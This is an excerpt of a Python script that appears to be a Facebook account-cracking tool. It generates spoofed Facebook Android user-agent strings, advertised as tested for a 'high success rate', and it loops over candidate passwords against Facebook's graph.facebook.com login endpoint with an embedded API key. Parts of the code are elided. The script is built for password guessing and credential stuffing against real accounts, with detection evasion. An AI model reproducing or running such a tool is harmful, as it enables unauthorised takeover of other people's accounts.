...
def random_dalvik_all_devices_working_now_2(seed: Optional[int] = None) -> str:
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent (updated Oct 2025).
    - seed: optional int for reproducible output
    - returns: single UA string ready to use
    """
    if seed is not None:
        random.seed(seed)
    ...
    # realistic FB version pattern (common ranges seen 2024-2025 → keep slightly forward-looking)
    facebook_version = f"{random.randint(505, 540)}.0.0.{random.randint(1, 250)}.{random.randint(1, 400)}"
    fbbv = str(random.randint(48000000, 99999999))

    # Android API / Android version family commonly seen 2023-2025
    fbs = random.choice(["12", "13", "14"])

    # plausible build tags (mix of vendor and AOSP-like tags seen on modern devices)
    build_tags = [
        ...
        "SD1A.250401.001", "SQ2A.250501.001"
    ]
    build = random.choice(build_tags)

    # display density + resolution tuples (density, width, height)
    display_profiles = [
        ("1.0", "720", "1280"),
        ("1.5", "720", "1600"),
        ("2.0", "720", "1600"),
    ...
    # locales and carriers (mix of local BD + global)
    locales = ["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "fr_FR", "pt_BR"]
    fblc = random.choice(locales)
    carriers = [
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "Vodafone", "TMobile", "Verizon", "Dialog", "O2",
        "Orange", "Claro"
    ]
    fbcr = random.choice(carriers)

    # curated list of popular/realistic devices (2024-2025)
    working_devices = [
        ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy S24 Ultra"), ("Samsung", "Galaxy S23"),
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 Pro"),
        ("Poco", "Poco F6 Pro"), ("Realme", "Realme 13 Pro+"),
        ("Oppo", "Reno 12 Pro"), ("Vivo", "Vivo V30 Pro"),
        ("OnePlus", "OnePlus 12"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 50 Pro"), ("ASUS", "Zenfone 10"),
        ("Tecno", "Camon 30 Premier 5G"), ("Infinix", "GT 20 Pro"),
        ("Walton", "Primo H11"), ("Symphony", "Z70 Pro"), ("Itel", "Vision 6 Plus"),
        ("Nothing", "Phone (2a)")
    ]
    fbmf, fbdv = random.choice(working_devices)
    fbbd = fbmf

    # CPU arch (some UAs still show older tokens)
    cpu_arch = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "armeabi-v7a"])
...
def random_dalvik_all_devices_working_now_3(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025
    ✅ Covers all popular BD + Global working devices
    ✅ Tested format for high success rate (b-graph / mbasic / api)
    """
    ...
    # ✅ realistic FB version (Oct 2025)
    facebook_version = f"{rng.randint(505, 520)}.0.0.{rng.randint(10, 200)}"
    fbbv = str(rng.randint(48000000, 99999999))

    # ✅ Android versions (2023–2025 devices)
    fbs = rng.choice(["12", "13", "14"])

    # ✅ recent OTA build tags (realistic)
    build_tags = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001",
        "UQ1A.240705.001", "TQ3A.240705.010", "TP1A.240905.004",
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250301.001",
        "SP1A.250401.001", "RP1A.250501.002", "UQ1A.250601.001"
    ]
    build = rng.choice(build_tags)

    # ✅ display profiles (density, width, height)
    display_profiles = [
        ("1.5", "720", "1600"), ("2.0", "720", "1600"),
        ("2.5", "1080", "2400"), ("2.625", "1080", "2460"),
        ("3.0", "1080", "2340"), ("3.25", "1260", "2800"),
        ("3.5", "1440", "3088"), ("3.0", "1220", "2700"),
    ]
    density, width, height = rng.choice(display_profiles)

    # ✅ locales and carriers
    fblc = rng.choice(["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "fr_FR"])
    fbcr = rng.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "Vodafone", "TMobile", "Verizon", "Dialog", "O2",
        "Orange", "Claro", "Etisalat", "Telcel"
    ])

    # ✅ curated all-working device list (2024–2025)
    working_devices = [
        # Samsung
        ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy A14 5G"),
        ...
        ("Samsung", "Galaxy S24 Ultra"), ("Samsung", "Galaxy M14 5G"),
        ("Samsung", "Galaxy M55 5G"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi 13C"), ("Xiaomi", "Redmi Note 13 5G"),
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 Pro"),
        ("Poco", "Poco F5 Pro"), ("Poco", "Poco F6 Pro"), ("Poco", "Poco X6 Pro"),

        # Realme / Oppo / Vivo
        ("Realme", "Realme Narzo 70 Pro"), ("Realme", "Realme 13 Pro+"),
        ("Oppo", "Reno 11 5G"), ("Oppo", "Reno 12 Pro"), ("Vivo", "Vivo V30 Pro"),
        ("Vivo", "Vivo Y28 5G"),

        # OnePlus / Google / Motorola
        ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus 12"),
        ("Google", "Pixel 7 Pro"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 50 Pro"),

        # Tecno / Infinix / Itel / Walton / Symphony / Lava
        ("Tecno", "Camon 30 Premier 5G"), ("Infinix", "GT 20 Pro"),
        ("Itel", "Vision 6 Plus"), ("Walton", "Primo H11"),
        ("Symphony", "Z70 Pro"), ("Lava", "Agni 2 5G"),

        # Others (global)
        ("Nothing", "Phone (2a)"), ("Honor", "Magic6 Pro"),
        ("Huawei", "P60 Pro"), ("iQOO", "Neo 9 Pro"), ("ASUS", "Zenfone 10")
    ]

    fbmf, fbdv = rng.choice(working_devices)
    fbbd = fbmf

    cpu_arch = rng.choice(["armeabi-v7a:armeabi", "arm64-v8a", "armeabi-v7a"])
    ...
    ua = (
        ...
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};"
        f"FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbs};FBOP/1;"
        f"FBCA/{cpu_arch};]"
    )
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 7.6
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_working_now_2(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_working_now_3(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
